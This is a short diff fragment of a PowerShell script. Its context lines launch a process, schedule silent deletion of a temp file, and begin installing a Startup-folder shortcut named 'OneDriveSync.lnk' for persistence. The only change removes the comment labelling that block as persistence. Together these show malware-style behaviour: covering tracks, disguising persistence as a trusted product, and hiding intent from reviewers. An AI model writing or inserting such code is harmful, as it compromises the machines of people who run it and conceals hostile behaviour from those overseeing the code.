@@ -42,7 +42,6 @@ $p = [System.Diagnostics.Process]::Start($psi)
 
 Start-Job -ScriptBlock { param($f) Start-Sleep -Seconds 15; Remove-Item $f -Force -ErrorAction SilentlyContinue } -ArgumentList $tempFile | Out-Null
 
-# Persistence (only once)
 $flag = "$env:TEMP\persist_$([Environment]::MachineName.GetHashCode()).dat"
 if (-not (Test-Path $flag)) {
     $lnkPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\OneDriveSync.lnk"
